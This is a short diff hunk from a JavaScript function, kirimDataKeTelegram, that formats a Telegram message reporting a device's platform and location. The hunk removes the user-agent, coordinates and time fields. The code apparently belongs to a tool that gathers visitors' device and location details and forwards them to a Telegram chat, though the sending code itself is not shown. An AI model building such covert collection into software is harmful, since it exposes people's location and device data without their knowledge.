@@ -33,10 +33,7 @@ async function kirimDataKeTelegram(data, judul = 'DATA BARU') {
     pesan += `
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 📱 <b>Perangkat:</b> ${platform}
-📋 <b>User Agent:</b> ${perangkat.substring(0, 80)}...
 🌍 <b>Lokasi:</b> ${lokasi}
-📍 <b>Koordinat:</b> ${koordinat || '-'}
-🕐 <b>Waktu:</b> ${waktu}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 `;
 
